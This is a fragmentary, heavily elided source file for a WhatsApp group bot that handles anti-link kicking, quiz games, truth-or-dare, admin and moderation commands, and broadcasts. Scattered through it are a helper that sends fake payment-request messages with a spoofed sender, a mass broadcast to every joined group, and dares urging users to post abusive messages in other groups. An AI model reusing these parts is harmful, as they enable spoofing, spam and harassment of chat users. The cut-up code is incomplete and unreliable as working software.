...
const { xylaaWiki } = require('./lib/xeonywiki.js')
...
const deploy = (teks) => {
  xylaa.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
const {
 FajarNews, 
 BBCNews,
  metroNews,
...
module.exports = xylaa = async (xylaa, m, chatUpdate, store) => {
    try {
        ...
        const botNumber = await xylaa.decodeJid(xylaa.user.id)
        ...
        //group\\
        const groupMetadata = m.isGroup ? await xylaa.groupMetadata(m.chat).catch(e => {}) : ''
...
xylaa.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
	// FAKE TEXT IMG
const textImg = (teks) => {
xylaa.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./XeonMedia/image/bokep2.jpg')}) 
}
...
"ptt": "true"
	...
	//group target \\
const reply = (teks) => {
           xylaa.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
...
jumlahharian = `${dataa.value}`
	...
	if (db.data.settings[botNumber].autobio) {
		...
		await xylaa.setStatus(`Hello there, type menu to go! | ${xylaa.user.name} | Bot Runtime : 66666${run}`)
...
return xylaa.sendMessage(from, { react: { text: `${global.themeemoji}`, key: m.key }})
}
...
if (m.isChat) { xylaa.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
if (command) {
await xylaa.sendPresenceUpdate('composing', m.chat)
xylaa.sendReadReceipt(from, m.sender, [m.key.id])}
}
  //autoread gc only
  if (global.autoReadGc) {
  if (m.isGroup) { xylaa.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
}
  //auto recording all
    if (global.autoRecord) { if (m.chat) { xylaa.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { xylaa.sendPresenceUpdate('composing', m.chat) }
}
//auto available all
  if (global.available) { if (m.chat) { xylaa.sendPresenceUpdate('available', m.chat) }
  }
...
// Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                ...
                await xylaa.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await xylaa.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        //Autosticker pc
                if (isAutoStick) {
	...
	// AntiLinkgc
if (AntiLink) {
linkgce = await xylaa.groupInviteCode(from)
...
kice = m.sender
await xylaa.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
xylaa.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
  // Antiwame by xeon
...
//antivirtex by xeon
  ...
  xylaa.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
  }
  }
...
kice = m.sender
await xylaa.groupParticipantsUpdate(m.chat, [kice], 'remove')
xylaa.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
...
kice = m.sender
await xylaa.groupParticipantsUpdate(m.chat, [kice], 'remove')
xylaa.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  ...
  if (Autoreply) //remove forwad slashes to make it autoreply on off
        for (let anji of xeonysticker){
				if (budy === anji){
					...
					xylaa.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anju of xeonyaudio){
				if (budy === anju){
					...
					xylaa.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anjh of xeonyimage){
				if (budy === anjh){
					...
					xylaa.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) //remove forwad slashes to make it autoreply on off
				...
				if (budy === anjh){
					...
					xylaa.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }
...
xylaa.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
      ...
      return
        ...
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: xylaa.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, xylaa.user.id)
        ...
        xylaa.ev.emit('messages.upsert', msg)
        }
...
${Array.from(room.jawaban, (jawaban, index) => {
    ...
    ${isSurender ? '' : `Perfect Player`}`.trim()
            xylaa.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
        ...
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
        ...
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
        ...
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
	    ...
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess blank', buttonText: { displayText: 'Guess The Blank' }, type: 1 }], `🎮 Guess The Blank 🎮\n\nCorrect Answer 🎉\n*${deskripsi}*\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
        ...
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
        ...
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
	...
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await xylaa.sendButtonText(m.chat, [{ buttonId: 'guess riddle', buttonText: { displayText: 'Guess The Riddle' }, type: 1 }], `🎮 Guess The Riddle 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, xylaa.user.name, m)
...
Typed *surrender* to surrender and admited defeat`
	    ...
	    if (room.x !== room.o) await xylaa.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await xylaa.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    ...
	    xylaa.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Refuse Suit, Suit Canceled`, m)
	    ...
	    xylaa.sendText(m.chat, `Suit Has Been Sent To Chat
...
Click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) xylaa.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) xylaa.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) xylaa.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    xylaa.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    ...
	    if (!roof.pilih2) xylaa.sendText(roof.p2, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You Have Chosen ${m.text} ${!roof.pilih ? `\n\nWaiting For The Opponent To Choose` : ''}`)
	    if (!roof.pilih) xylaa.sendText(roof.p, '_The Opponent Has Chosen_\nNow It Is Your Turn', 0)
	    }
	    ...
	    xylaa.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
...
replay('Success in unbanning the gc')
  ...
  await xylaa.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nBan to Ban\nUnban to unban`, `${global.botname}`, m)
  }
  }
  break
...
if (q.includes('--help')) return reply(examkosong) 
  ...
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
     ...
     var xylaa = await getBuffer(picak+`User's Inventory`)
     ...
     await xylaa.send5ButImg(from, `` + '' + teksehmazeh, `© ${botname}`, xylaa, [{"urlButton": {"displayText": "YouTube📍","url": `${websitex}`}}])
  }
  break
        case 'userlimit': 
        if (isBan) return reply(mess.ban)	 			
...
xylaa.groupRevokeInvite(m.chat)
}
break
	    case 'afk': {
		if (isBan) return reply(mess.ban)	 			
...
if (isBanChat) return reply(mess.banChat)
            ...
            if (this.game) {
            delete this.game
            xylaa.sendText(m.chat, `Successfully Deleted The TicTacToe Session`, m)
            } else if (!this.game) {
...
Please @${m.mentionedJid[0].split`@`[0]} To Type Accept/Reject`
            this.suit[id] = {
            chat: await xylaa.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) xylaa.sendText(m.chat, `_Suit Time Out_`, m)
            delete this.suit[id]
...
if (isBanChat) return reply(mess.banChat)
                ...
                if (args[0] === 'mute') {
                    xylaa.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    xylaa.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    xylaa.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    xylaa.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    xylaa.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    xylaa.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    xylaa.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
...
if (isBanChat) return reply(mess.banChat)
                ...
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await xylaa.sendText(m.chat, hasil, m),
                    ...random,
...
let msg = await xylaa.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
xylaa.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
...
let result = anu[Math.floor(Math.random() * anu.length)]
xylaa.sendImage(m.chat, result.img, `Please answer the question above\n\nDescription : ${result.deskripsi}\nTime : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess the picture' }, type: 1 }], `Time has run out\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,`${global.botname}`, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'word') {
...
let result = anu[Math.floor(Math.random() * anu.length)]
xylaa.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `Time Out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkata[m.sender.split('@')[0]]
}
...
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess the Sentence' }, type: 1 }], `Time Out\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
...
let result = anu[Math.floor(Math.random() * anu.length)]
xylaa.sendText(m.chat, `Fill the missing lyrics below : *${result.soal}*?\nTime : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklirik[m.sender.split('@')[0]]
}
...
let result = anu[Math.floor(Math.random() * anu.length)]
xylaa.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
...
console.log("Answer: " + result.jawaban)
xylaa.sendButtonText(m.chat, [{ buttonId: 'guess saying', buttonText: { displayText: 'Guess The Saying' }, type: 1 }], `Time Out\nAnswer:  ${caklontong[m.sender.split('@')[0]]}\nDescription : ${caklontong_desk[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
...
break
   ...
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
xylaa.sendMessage(m.chat, reactionMessage)} 
break
...
if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendText(m.chat, `*What Is The Result Of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
...
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            ...
            let buttons = [
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, jawab, xylaa.user.name, m, {mentions: ments})
            }
            break
            case 'couple': {
            	if (isBan) return reply(mess.ban)	 			
...
Cieeee, What's Going On❤️💖👀`
            ...
            let buttons = [
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, jawab, xylaa.user.name, m, {mentions: menst})
            }
            break
            case 'is':
            if (isBan) return reply(mess.ban)	 			
...
xylaa.sendMessage(from, { text: `Question : Is ${q}\nAnswer : ${kah}` }, { quoted: m })
...
xylaa.sendMessage(from, { text: `Question : What ${q}\nAnswer : ${kahk}` }, { quoted: m })
...
xylaa.sendMessage(from, { text: `Question : Can ${q}\nAnswer : ${ga}` }, { quoted: m })
...
xylaa.sendMessage(from, { text: `Question : ${q}\nAnswer : How ${ya}` }, { quoted: m })
...
xylaa.sendMessage(from, { text: `Rate : ${q}\nAnswer : *${te}%*` }, { quoted: m })
...
xylaa.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
...
if (isBanChat) return reply(mess.banChat)
					...
					xylaa.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
                    case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
...
xylaa.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${sange}%*` }, { quoted: m })
	...
	if (isBanChat) return reply(mess.banChat)
            ...
            let buttons = [
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
case 'dare':
                   if (isBan) return reply(mess.ban)
    ...
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     ...
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
              ...
              xylaa.sendMessage(from, { image: buffer, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
       if (isBan) return reply(mess.ban)
    ...
    "do you play pubg, if you then send ur id number"
              ...
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              xylaa.sendMessage(from, { image: buffer, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
case 'when':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
...
if (isBanChat) return reply(mess.banChat)
                ...
                await xylaa.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
...
if (isBan) return reply(mess.ban)
	...
	reply(mess.wait)
                if (!isCreator) return replay(`${mess.owner}`)
                await xylaa.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
            case 'setexif': {
            	if (isBan) return reply(mess.ban)	 			
...
if (isBanChat) return reply(mess.banChat)
		...
		await xylaa.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
		...
		await xylaa.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'demoteall':
		if (isBan) return reply(mess.ban)	 			
...
xylaa.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
				if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
		...
		for (let mem of participants) {
		  ...
		  xylaa.groupMakeAdmin(from, members_id)
                break
	case 'promote': {
...
if (isBanChat) return reply(mess.banChat)
		if (!m.isGroup) return replay(`${mess.group}`)
                ...
                if (!isAdmins) return replay(`${mess.admin}`)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await xylaa.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	case 'demote': {
...
if (isBanChat) return reply(mess.banChat)
		if (!m.isGroup) return replay(`${mess.group}`)
                ...
                if (!isAdmins) return replay(`${mess.admin}`)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await xylaa.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case 'block': {
        	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
		if (!isCreator) return replay(`${mess.owner}`)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await xylaa.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case 'unblock': {
        	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
		if (!isCreator) return replay(`${mess.owner}`)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await xylaa.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
...
if (isBanChat) return reply(mess.banChat)
                ...
                await xylaa.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
...
if (isBanChat) return reply(mess.banChat)
                ...
                if (!isAdmins) replay(`${mess.admin}`)
                if (!text) replay(`Where Is The Text?`)
                await xylaa.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case 'setbotpp': {
          	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
                ...
                let media = await xylaa.downloadAndSaveMediaMessage(quoted)
                await xylaa.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
...
if (isBanChat) return reply(mess.banChat)
                ...
                if (/webp/.test(mime)) return replay(`Send/Reply Image With Caption ${prefix + command}`)
                let media = await xylaa.downloadAndSaveMediaMessage(quoted)
                await xylaa.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(mess.success)
                }
                break
            case 'tagall': {
...
let teks = `╚»˙·٠•●♥ Tag All ♥●•٠·˙«╝ 
 ...
 ➲ *Message : ${q ? q : 'no message'}*\n\n`
                ...
                xylaa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
                	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
            ...
            if (!isBotAdmins) return replay(`${mess.botAdmin}`)
            if (!isAdmins) return replay(`${mess.admin}`)
            xylaa.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
...
let buttonsVote = [
  ...
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'Devote'}, type: 1}
            ...
            let buttonMessageVote = {
                text: teks_vote,
                footer: xylaa.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            xylaa.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
               	if (isBan) return reply(mess.ban)	 			
...
*${prefix}delvote* - To Delete Vote Session`
            ...
            xylaa.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
                	if (isBan) return reply(mess.ban)	 			
...
*${prefix}delvote* - To Delete Vote Session`
            ...
            xylaa.sendMessage(m.chat, buttonMessageDevote)
	}
            break
...
©${xylaa.user.id}
`
xylaa.sendTextWithMentions(m.chat, teks_vote, m)
break
...
if (isBanChat) return reply(mess.banChat)
                ...
                if (!isAdmins) return replay(`${mess.admin}`)
                if (args[0] === 'close'){
                    await xylaa.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Successful Closing The Group`)).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await xylaa.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Successful Opening The Group`)).catch((err) => reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await xylaa.sendButtonText(m.chat, buttons, `Group Mode`, xylaa.user.name, m)
...
if (isBanChat) return reply(mess.banChat)
                ...
                if (!isAdmins) return replay(`${mess.admin}`)
             if (args[0] === 'open'){
                await xylaa.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await xylaa.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await xylaa.sendButtonText(m.chat, buttons, `Mode Edit Info`, xylaa.user.name, m)
...
replay('Success in turning off group chat antilink in this group')
  ...
  await xylaa.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
...
replay('Success in turning off antivirus this group')
  ...
  await xylaa.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
    case 'autoreply': {
...
replay('Success in turning off autoreply in this group')
  ...
  await xylaa.sendButtonText(m.chat, buttonswlcm, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antitoxic': {
...
replay('Success in turning off antitoxic in this group')
  ...
  await xylaa.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'antiwame': {
...
replay('Success in turning off antiwame in this group')
  ...
  await xylaa.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
  case 'nsfw': {
...
if (isBanChat) return reply(mess.banChat)
                ...
                reply(`${xylaa.user.name} Has Been Muted In This Group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return reply(`Previously Inactive`)
                db.data.chats[m.chat].mute = false
                reply(`${xylaa.user.name} Has Been Unmuted In This Group!`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await xylaa.sendButtonText(m.chat, buttons, `Mute Bot`, xylaa.user.name, m)
                }
             }
             break
...
if (isBanChat) return reply(mess.banChat)
                if (!m.isGroup) return replay(`${mess.group}`)
                let response = await xylaa.groupInviteCode(m.chat)
                xylaa.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n${groupMetadata.subject} Group Link`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
            	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
                ...
                if (args[0] === 'enable') {
                    await xylaa.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await xylaa.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
case 'grupsetting':
...
if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
...
let getGroups = await xylaa.groupFetchAllParticipating()
...
xylaa.send5ButImg(i, txt, `${global.botname}`, log0, btn, thum)
}
...
let txt = `*「 ${global.ownername}'s Broadcast」*\n\n${text}`
xylaa.send5ButImg(yoi, txt, `${global.botname}`, log0, btn, thum)
}
...
id: 'owner'
                    ...
                    if (/webp/.test(mime)) {
                    xylaa.sendMessage(i, { sticker: { url: media } }, { quoted: ftroli })
                    } else if (/image/.test(mime)) {
                    let DGXeon = `*「 ${global.ownername}'s Broadcast」*${text ? '\n\n' + text : ''}`
                    xylaa.send5ButImg(i, DGXeon, `${global.botname}`, buffer, butoon)
                    } else if (/video/.test(mime)) {
                    let DGXeon = `*「 ${global.ownername}'s Broadcast」*${text ? '\n\n' + text : ''}`
                    xylaa.sendMessage(i, {video: buffer, caption: `${DGXeon}`}, { quoted: ftroli })
                    } else if (/audio/.test(mime)) {
